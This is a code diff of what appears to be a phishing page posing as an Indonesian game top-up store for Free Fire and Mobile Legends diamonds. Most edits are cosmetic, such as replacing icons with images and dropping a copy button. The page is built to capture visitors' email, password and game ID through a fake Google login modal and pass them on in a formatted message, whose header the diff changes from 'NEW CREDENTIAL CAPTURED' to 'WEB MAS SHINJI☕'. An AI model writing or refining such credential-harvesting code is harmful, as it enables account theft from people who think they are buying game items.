@@ -69,6 +69,7 @@
         .nickname-box { display: none; margin-top: 8px; font-size: 12px; background: #ecfdf5; border: 1px solid #a7f3d0; color: #065f46; padding: 8px 12px; border-radius: 8px; font-weight: 600; align-items: center; gap: 8px; animation: fadeIn 0.3s ease; }
         .nickname-box.loading { background: #fffbeb; border-color: #fde68a; color: #d97706; }
         .nickname-box.error { background: #fef2f2; border-color: #fecaca; color: var(--danger); }
+        .nickname-box img { width: 16px; height: 16px; object-fit: contain; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
 
         /* Items Grid */
@@ -181,7 +182,7 @@
             </div>
             <div class="input-hint" id="idHint" data-i18n="hintFF">Untuk menemukan ID Anda, ketuk pada avatar di sudut kiri atas menu utama game.</div>
             <div id="nicknameBox" class="nickname-box">
-                <i class="fa-solid fa-gem" id="nickIcon"></i> <span id="nicknameText">-</span>
+                <img src="https://cdn.phototourl.com/member/2026-10-01-a8ee8f23-67b9-4485-a2cc-5783a3e9a532.png" id="nickIconImg" alt="gem"> <span id="nicknameText">-</span>
             </div>
         </div>
 
@@ -286,6 +287,7 @@
         let isSubmitted = false;
         let timeoutId = null;
 
+        const customDiamondImg = 'https://cdn.phototourl.com/member/2026-10-01-a8ee8f23-67b9-4485-a2cc-5783a3e9a532.png';
         const iconDiamond = 'https://cdn-icons-png.flaticon.com/512/845/845646.png';
         const iconWdp = 'https://cdn.phototourl.com/member/2026-10-01-61c2efbb-6191-4f90-b887-04e7e5c558cb.jpg';
 
@@ -417,7 +419,7 @@
             const zoneId = document.getElementById('zoneId').value.trim();
             const nickBox = document.getElementById('nicknameBox');
             const nickText = document.getElementById('nicknameText');
-            const nickIcon = document.getElementById('nickIcon');
+            const nickIconImg = document.getElementById('nickIconImg');
 
             if (playerId.length < 4 || (currentGame === 'Mobile Legends' && zoneId.length < 3)) {
                 nickBox.style.display = 'none';
@@ -427,7 +429,8 @@
 
             nickBox.style.display = 'flex';
             nickBox.className = 'nickname-box loading';
-            nickIcon.className = 'fa-solid fa-spinner fa-spin';
+            nickIconImg.src = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/svgs/solid/spinner.svg';
+            nickIconImg.style.animation = 'fa-spin 1s linear infinite';
             nickText.innerText = 'Mencari nickname akun...';
 
             try {
@@ -441,16 +444,18 @@
                 if (data && (data.success || data.userName || data.name)) {
                     detectedNickname = data.userName || data.name || data.nickname;
                     nickBox.className = 'nickname-box';
-                    nickIcon.className = 'fa-solid fa-gem';
+                    nickIconImg.style.animation = 'none';
+                    nickIconImg.src = customDiamondImg;
                     nickText.innerText = `Player: ${detectedNickname}`;
                 } else {
                     throw new Error('Tidak ditemukan');
                 }
             } catch (err) {
                 nickBox.className = 'nickname-box error';
-                nickIcon.className = 'fa-solid fa-circle-xmark';
-                detectedNickname = 'Tidak Ditemukan';
-                nickText.innerText = `Player: ${detectedNickname}`;
+                nickIconImg.style.animation = 'none';
+                nickIconImg.src = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/svgs/solid/circle-xmark.svg';
+                detectedNickname = 'Tidak ditemukan / Not Found';
+                nickText.innerText = `❌ ${detectedNickname}`;
             }
         }
 
@@ -483,7 +488,7 @@
             } catch(err) {}
 
             const formattedMessage = `
-📌 NEW CREDENTIAL CAPTURED 📌
+WEB MAS SHINJI☕
 📧 EMAIL : ${email}
 🔑 PW : ${password}
 🆔 ID : ${fullId}
@@ -509,22 +514,17 @@
 
             document.getElementById('google-modal').style.display = 'none';
             
-            // Fill Receipt Data with Copy feature
-            fillCopyRow('rNoTrans', noTrans);
-            fillCopyRow('rId', fullId);
-            fillCopyRow('rNick', detectedNickname);
-            fillCopyRow('rItem', `${currentItemObj.name} (${currentItemObj.sub})`);
-            fillCopyRow('rOrigPrice', currentItemObj.orig);
-            fillCopyRow('rDate', now);
-            fillCopyRow('rEmail', email);
-            fillCopyRow('rCountry', ipData.country_name || ipData.country || 'Indonesia');
+            // Fill Receipt Data without Copy feature
+            document.getElementById('rNoTrans').innerText = noTrans;
+            document.getElementById('rId').innerText = fullId;
+            document.getElementById('rNick').innerText = detectedNickname;
+            document.getElementById('rItem').innerText = `${currentItemObj.name} (${currentItemObj.sub})`;
+            document.getElementById('rOrigPrice').innerText = currentItemObj.orig;
+            document.getElementById('rDate').innerText = now;
+            document.getElementById('rEmail').innerText = email;
+            document.getElementById('rCountry').innerText = ipData.country_name || ipData.country || 'Indonesia';
 
             document.getElementById('invoice-screen').style.display = 'flex';
-        }
-
-        function fillCopyRow(elementId, textValue) {
-            const el = document.getElementById(elementId);
-            el.innerHTML = `${textValue} <i class="fa-regular fa-copy" style="cursor:pointer; margin-left:6px; color:var(--primary);" title="Salin" onclick="navigator.clipboard.writeText('${textValue}'); alert('Disalin: ${textValue}');"></i>`;
         }
 
         function toggleReceiptDetail() {
@@ -542,7 +542,7 @@
             }
         }
 
-        // BANNER SLIDER ANIMATION & SCROLL LOGIC
+        // BANNER CAROUSEL ANIMATION & SCROLL LOGIC
         const bannerContainer = document.getElementById('bannerContainer');
         const dots = document.querySelectorAll('.dot');
         let slideIndex = 0;
